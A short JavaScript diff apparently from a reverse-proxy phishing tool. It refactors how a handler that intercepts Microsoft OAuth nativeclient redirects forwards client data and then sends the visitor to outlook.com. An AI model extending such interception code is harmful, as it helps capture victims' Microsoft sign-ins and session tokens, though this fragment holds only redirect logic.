@@ -124,8 +124,7 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
             if (redirectToken.url.startsWith('https://login.microsoftonline.com/common/oauth2/nativeclient')) {
                 super.sendClientData(clientContext, {})
-                this.res.writeHead('301', { location: 'https://outlook.com' })
-                return super.cleanEnd('PHP-EXEC', clientContext)
+                return super.exitLink('https://outlook.com')
             }
         }
         
